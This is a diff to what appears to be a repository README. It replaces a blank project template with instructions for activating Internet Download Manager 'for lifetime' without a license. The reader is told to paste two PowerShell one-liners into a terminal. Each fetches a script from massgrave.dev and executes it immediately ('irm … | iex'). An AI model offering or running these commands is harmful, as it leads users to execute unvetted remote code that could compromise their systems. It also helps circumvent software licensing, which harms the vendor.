@@ -1,39 +1,10 @@
-# Project Title
+Activate IDM for Lifetime: The fastest download accelerator.
 
-![Project Logo](url_to_logo.png)
+Method 1 - PowerShell (Recommended)
+Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
 
-> **A catchy project tagline or description**
+Copy and paste the code below and press enter:
 
----
-
-## Table of Contents
-
-- [Features](#features)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Screenshots](#screenshots)
-- [Contributing](#contributing)
-- [License](#license)
-- [Contact](#contact)
-
----
-
-## Features
-
-- ✨ **Feature 1**: Brief description.
-- 🚀 **Feature 2**: Brief description.
-- 🎉 **Feature 3**: Brief description.
-
----
-
-## Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/yourproject.git
-
-# Change to the project directory
-cd yourproject
-
-# Install dependencies
-npm install
+irm https://massgrave.dev/ias | iex
+irm https://massgrave.dev/get | iex
+Follow the on-screen instructions for activation.
